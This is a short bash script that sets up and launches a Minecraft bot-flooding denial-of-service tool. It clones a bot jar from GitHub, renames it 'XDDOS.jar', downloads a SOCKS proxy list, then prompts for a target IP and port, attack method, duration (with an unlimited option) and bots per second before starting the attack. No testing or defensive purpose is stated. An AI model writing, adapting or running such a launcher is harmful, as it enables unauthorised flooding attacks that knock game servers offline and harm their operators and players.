#!/usr/bin/env bash
mkdir botter
cd botter
git clone https://github.com/XD-UrDaD/MCBOT-1
cd MCBOT-1
mv * ..
cd ..
mv MCBOT.jar XDDOS.jar
apt install git
apt-get install openjdk-11-jdk -y
wget https://raw.githubusercontent.com/XDMEOW/SocksProxy/main/proxies.txt
echo IP:PORT
read ip
echo "Protocol (get all Protocal version here https://wiki.vg/Protocol_version_numbers)"
read protocol
echo "To You Know Protocols (Y/N)"
read no
echo "Method (Name)"
read name
echo "Time For the Attack to Run (-1 For Unlimited)"
read ti
echo "Target CPS (Bot per Sec)"
read cps
echo "Starting Attack XDDOS ON TOP"
java -jar XDDOS.jar $ip $protocol $name $ti $cps
